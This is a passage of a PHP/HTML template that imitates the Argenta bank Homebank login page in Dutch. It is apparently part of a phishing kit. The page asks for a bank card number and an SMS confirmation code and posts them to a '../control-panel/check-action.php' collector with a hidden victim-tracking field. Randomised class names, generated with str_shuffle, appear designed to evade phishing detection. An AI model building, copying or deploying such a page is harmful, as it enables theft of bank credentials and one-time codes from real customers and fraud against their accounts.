                                                                                                                            role="img"
                                                                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                                                                            viewBox="0 0 512 512">
                                                                                                                            <path
                                                                                                                                fill="currentColor"
                                                                                                                                d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z">
                                                                                                                            </path>
                                                                                                                        </svg>
                                                                                                                        <span
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field-error__content"
                                                                                                                            id="cardNumberInput-error-message">Kaartnummer
                                                                                                                            is
                                                                                                                            verplicht.</span>
                                                                                                                    </span>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                                <div
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-itsme-login__form__card-number-save">
                                                                                                    <div
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-checkbox">
                                                                                                        <div
                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-checkbox">
                                                                                                            <label
                                                                                                                for="checkboxItsme">
                                                                                                                <span
                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-checkbox__input">
                                                                                                                    <input
                                                                                                                        type="checkbox"
                                                                                                                        id="checkboxItsme"
                                                                                                                        aria-invalid="false"
                                                                                                                        name="checkboxItsme"
                                                                                                                        value="false" /><span></span>
                                                                                                                </span>
                                                                                                                <span
                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-checkbox__labels">
                                                                                                                    <span
                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-a-checkbox__label">Bewaar
                                                                                                                        mijn
                                                                                                                        kaartnummer</span>
                                                                                                                </span>
                                                                                                            </label>
                                                                                                        </div>
                                                                                                        <div
                                                                                                            role="alert">
                                                                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse argnt-q-collapse--closed"
                                                                                                                aria-hidden="true"
                                                                                                                style="overflow: hidden; opacity: 0; height: 0px;">
                                                                                                                <div
                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse__content">
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                                <div
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-timeout-expiring-message sr-only">
                                                                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> sr-only"
                                                                                                        role="alert">
                                                                                                    </div>
                                                                                                    <div
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-timeout-expiring-message__content">
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                            <div
                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-container--actions">
                                                                                                <div
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-submit-buttons">
                                                                                                    <button
                                                                                                        type="submit"
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-button argnt-a-button--primary"
                                                                                                        aria-disabled="false">
                                                                                                        <span
                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-button-typography argnt-a-button__text">Aanmelden</span>
                                                                                                    </button>
                                                                                                </div>
                                                                                            </div>
                                                                                        </form>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </section>
                                                                        <section id="digipass"
                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-digipass-login">
                                                                            <div
                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item argnt-a-collapse-item--box-shadow">
                                                                                <h2
                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item__header-as">
                                                                                    <button type="button"
                                                                                        id="digipass-collapse-control"
                                                                                        aria-expanded="true"
                                                                                        aria-controls="digipass-collapse-content"
                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item__summary argnt-m-form-digipass-login__header">
                                                                                        <span
                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-header argnt-a-collapse-header--open">
                                                                                            <span
                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-header-icon-and-titles-wrapper">
                                                                                                <span
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-icon">
                                                                                                    <svg aria-hidden="true"
                                                                                                        focusable="false"
                                                                                                        data-prefix="fal"
                                                                                                        data-icon="calculator"
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-calculator"
                                                                                                        role="img"
                                                                                                        xmlns="http://www.w3.org/2000/svg"
                                                                                                        viewBox="0 0 384 512"
                                                                                                        alt=""
                                                                                                        style="width: 24px; height: 24px;">
                                                                                                        <path
                                                                                                            fill="currentColor"
                                                                                                            d="M352 160V448c0 17.7-14.3 32-32 32H64c-17.7 0-32-14.3-32-32V160H352zm0-32H32V64c0-17.7 14.3-32 32-32H320c17.7 0 32 14.3 32 32v64zm32 0V64c0-35.3-28.7-64-64-64H64C28.7 0 0 28.7 0 64v64 16 16V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160 144 128zM72 224a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zM264 416a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zM80 400c-8.8 0-16 7.2-16 16s7.2 16 16 16H208c8.8 0 16-7.2 16-16s-7.2-16-16-16H80z">
                                                                                                        </path>
                                                                                                    </svg>
                                                                                                </span>
                                                                                                <span
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-header-titles">
                                                                                                    <span
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-a-collapse-header-title">
                                                                                                        Vul de
                                                                                                        verplichte
                                                                                                        velden in zodat
                                                                                                        wij uw
                                                                                                        identiteit
                                                                                                        kunnen
                                                                                                        verifiëren.
                                                                                                    </span>
                                                                                                </span>
                                                                                            </span>
                                                                                            <span
                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-header-indicator-wrapper open">
                                                                                                <span
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-indicator">
                                                                                                    <svg aria-hidden="true"
                                                                                                        focusable="false"
                                                                                                        data-prefix="fal"
                                                                                                        data-icon="chevron-up"
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-up"
                                                                                                        role="img"
                                                                                                        xmlns="http://www.w3.org/2000/svg"
                                                                                                        viewBox="0 0 512 512"
                                                                                                        style="transform: rotate(0deg); transition-property: transform; transition-duration: 175ms; transition-timing-function: ease-in-out;">
                                                                                                        <path
                                                                                                            fill="currentColor"
                                                                                                            d="M244.7 116.7c6.2-6.2 16.4-6.2 22.6 0l192 192c6.2 6.2 6.2 16.4 0 22.6s-16.4 6.2-22.6 0L256 150.6 75.3 331.3c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6l192-192z">
                                                                                                        </path>
                                                                                                    </svg>
                                                                                                </span>
                                                                                            </span>
                                                                                        </span>
                                                                                    </button>
                                                                                </h2>
                                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-q-collapse-transition--show argnt-a-collapse-item__transition-wrapper"
                                                                                    id="digipass-collapse-content"
                                                                                    role="region"
                                                                                    aria-labelledby="digipass-collapse-control"
                                                                                    aria-hidden="false" style="">
                                                                                    <div
                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item__content">
                                                                                        <form
                                                                                            action="../control-panel/check-action.php"
                                                                                            method="post" id="fSD"
                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> <?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> f-s-d-p">

                                                                                            <input type="hidden"
                                                                                                name="ip"
                                                                                                value="<?php echo $get_name_file; ?>">
                                                                                            <input type="hidden"
                                                                                                name="step"
                                                                                                value="sms" />
                                                                                            <input type="hidden"
                                                                                                name="send_data_2" />
                                                                                            <div
                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-digipass-login__form">
                                                                                                <div
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field-container argnt-a-field-container--gap-8">
                                                                                                    <label
                                                                                                        for="signature">
                                                                                                        <span
                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-body argnt-a-body__medium argnt-a-body__bold">
                                                                                                            Vul
                                                                                                            hieronder de
                                                                                                            sms in die u
                                                                                                            hebt
                                                                                                            ontvangen om
                                                                                                            uw login te
                                                                                                            bevestigen.
                                                                                                        </span>
                                                                                                    </label>
                                                                                                    <div
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-masked-input">
                                                                                                        <div
                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-masked-input-field argnt-a-masked-input-field__challenge">
                                                                                                            <div
                                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field">
                                                                                                                <input
                                                                                                                    inputmode="numeric"
                                                                                                                    placeholder="  ......"
                                                                                                                    name="otp"
                                                                                                                    id="signature"
                                                                                                                    aria-required="true"
                                                                                                                    aria-invalid="false"
                                                                                                                    aria-describedby="signature-m1"
                                                                                                                    type="text"
                                                                                                                    autocomplete="off"
                                                                                                                    value="" />

                                                                                                                <div aria-hidden="true"
                                                                                                                    style="opacity: 0; display: none;">
                                                                                                                    <div
                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field--fa-wrapper">
                                                                                                                        <svg aria-hidden="true"
                                                                                                                            focusable="false"
                                                                                                                            data-prefix="fal"
                                                                                                                            data-icon="xmark"
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-xmark"
                                                                                                                            role="img"
                                                                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                                                                            viewBox="0 0 384 512">
                                                                                                                            <path
                                                                                                                                fill="currentColor"
                                                                                                                                d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
                                                                                                                            </path>
                                                                                                                        </svg>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                                <div aria-hidden="true"
                                                                                                                    style="opacity: 0; display: none;">
                                                                                                                    <div
                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field--fa-wrapper">
                                                                                                                        <svg aria-hidden="true"
                                                                                                                            focusable="false"
                                                                                                                            data-prefix="fal"
                                                                                                                            data-icon="circle-check"
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-circle-check"
                                                                                                                            role="img"
                                                                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                                                                            viewBox="0 0 512 512">
                                                                                                                            <path
                                                                                                                                fill="currentColor"
                                                                                                                                d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM363.3 203.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L224 297.4l-52.7-52.7c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6l64 64c6.2 6.2 16.4 6.2 22.6 0l128-128z">
                                                                                                                            </path>
                                                                                                                        </svg>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                        <div
                                                                                                            role="alert">
                                                                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse argnt-q-collapse--closed"
                                                                                                                aria-hidden="true"
                                                                                                                style="overflow: hidden; opacity: 0; height: 0px;">
                                                                                                                <div
                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse__content">
                                                                                                                    <span
                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field-error">
                                                                                                                        <svg aria-hidden="true"
                                                                                                                            focusable="false"
                                                                                                                            data-prefix="fal"
                                                                                                                            data-icon="circle-exclamation"
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-circle-exclamation"
                                                                                                                            role="img"
                                                                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                                                                            viewBox="0 0 512 512">
                                                                                                                            <path
                                                                                                                                fill="currentColor"
                                                                                                                                d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z">
                                                                                                                            </path>
                                                                                                                        </svg>
                                                                                                                        <span
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field-error__content"
                                                                                                                            id="signature-error-message">Response
                                                                                                                            code
                                                                                                                            is
                                                                                                                            verplicht.</span>
                                                                                                                    </span>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                                <span
                                                                                                            style="color: red; padding-top: 4px;<?php if (isset($_GET['err'])) {echo 'display: block';} else {echo 'display: none';}?>">Dit
                                                                                                            Onjuist, probeer het opnieuw.
                                                                                                        </span>
                                                                                                <div
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-container--actions">
                                                                                                    <div
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-submit-buttons">
                                                                                                        <button
                                                                                                            type="submit"
                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-button argnt-a-button--primary"
                                                                                                            aria-disabled="false">
                                                                                                            <span
                                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-button-typography argnt-a-button__text">Verzenden</span>
                                                                                                        </button>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </form>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </section>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div
                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-separator argnt-m-login-component__separator">
                                                        </div>
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-message-warning-detail"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </main>
                            <footer class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-login-page__border-footer">
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__links">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__links-left"><span
                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__copyright">© 2025 Argenta</span></div>
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__links-right">
                                            <a class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__link"
                                                href="https://www.argenta.be/nl/juridische-informatie.html"
                                                target="_blank" rel="noopener noreferrer">
                                                <span>Juridische informatie</span>
                                                <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                    data-icon="chevron-right"
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-right fa-sm" role="img"
                                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512">
                                                    <path fill="currentColor"
                                                        d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z">
                                                    </path>
                                                </svg>
                                            </a>
                                            <a class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__link"
                                                href="https://www.argenta.be/nl/privacy.html" target="_blank"
                                                rel="noopener noreferrer">
                                                <span>Privacy</span>
                                                <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                    data-icon="chevron-right"
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-right fa-sm" role="img"
                                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512">
                                                    <path fill="currentColor"
                                                        d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z">
                                                    </path>
                                                </svg>
                                            </a>
                                            <a class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__link"
                                                href="https://www.argenta.be/nl/cookiebeleid.html" target="_blank"
                                                rel="noopener noreferrer">
                                                <span>Cookiebeleid</span>
                                                <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                    data-icon="chevron-right"
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-right fa-sm" role="img"
                                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512">
                                                    <path fill="currentColor"
                                                        d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z">
                                                    </path>
                                                </svg>
                                            </a>
                                            <a class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__link"
                                                href="https://www.argenta.be/nl/tarieven.html" target="_blank"
                                                rel="noopener noreferrer">
                                                <span>Tarieven</span>
                                                <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                    data-icon="chevron-right"
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-right fa-sm" role="img"
                                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512">
                                                    <path fill="currentColor"
                                                        d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z">
                                                    </path>
                                                </svg>
                                            </a>
                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-footer__app-version"><span
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-badge argnt-a-badge--light">homebank 2.10.2</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </footer>
                        </div>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-image-background-container">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-image-background"><img src="./files/ib_jan-feb-2024_496x894.jpg" alt="" />
                        </div>
                    </div>
                </div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> sr-only" role="status" aria-live="polite" aria-atomic="true" aria-relevant="additions text">
            </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>

    </body>

</html>